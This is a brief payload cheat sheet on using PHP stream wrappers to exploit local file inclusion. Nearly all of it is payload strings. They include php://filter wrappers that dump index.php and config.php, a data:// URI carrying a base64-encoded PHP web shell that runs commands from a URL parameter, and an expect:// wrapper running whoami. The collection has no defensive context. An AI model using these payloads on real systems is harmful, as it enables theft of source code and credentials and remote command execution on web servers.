# PHP Wrappers

## Summary
Use PHP stream wrappers for LFI exploitation.

## Payloads

```
php://filter/convert.base64-encode/resource=index.php
php://filter/convert.iconv.utf-8.utf-7/resource=config.php
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==
expect://whoami
```
